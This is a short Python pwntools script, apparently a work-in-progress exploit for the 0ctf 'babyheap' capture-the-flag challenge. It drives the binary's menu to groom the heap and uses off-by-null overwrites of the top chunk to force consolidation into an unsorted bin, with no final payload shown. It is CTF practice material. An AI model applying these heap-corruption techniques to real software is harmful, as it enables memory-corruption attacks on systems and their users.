from pwn import *

r = process("./babyheap", env = {"LD_LIBRARY_PATH": "/home/poortho/ctf/0ctf/babyheap/"})
gdb.attach(r)
print r.recvuntil("Command: ")
def allocate(size):
    r.sendline('1')
    print r.recvuntil("Size: ")
    r.sendline(str(size))
    print r.recvuntil("Command: ")

def update(index, size, content):
    r.sendline('2')
    print r.recvuntil("Index: ")
    r.sendline(str(index))
    print r.recvuntil("Size: ")
    r.sendline(str(size))
    print r.recvuntil("Content: ")
    r.send(content)
    print r.recvuntil("Command: ")

def delete(index):
    r.sendline('3')
    print r.recvuntil("Index: ")
    r.sendline(str(index))
    print r.recvuntil("Command: ")

def view(index):
    r.sendline('4')
    print r.recvuntil("Index: ")
    r.sendline(str(index))
    print r.recvuntil("Chunk[")
    s = r.recvline()
    s = s.split("]: ")[1][:-1]
    print r.recvuntil("Command: ")
    return s

for x in range(16):
    allocate(0x28)
    update(x, 0x28, chr(ord('A')+x)*0x28) #repeatedly overwrite top with null byte to shrink it faster
for x in range(16):
    delete(x) #free up space for more allocations
for x in range(14):
    allocate(0x18) #finish depleting top
    update(x, 0x18, 'A'*0x18)
allocate(0x18) #calls consolidate, creates small (unsorted?) bin at around 0x5555555793b0
for x in range(13):
    delete(x)
r.interactive()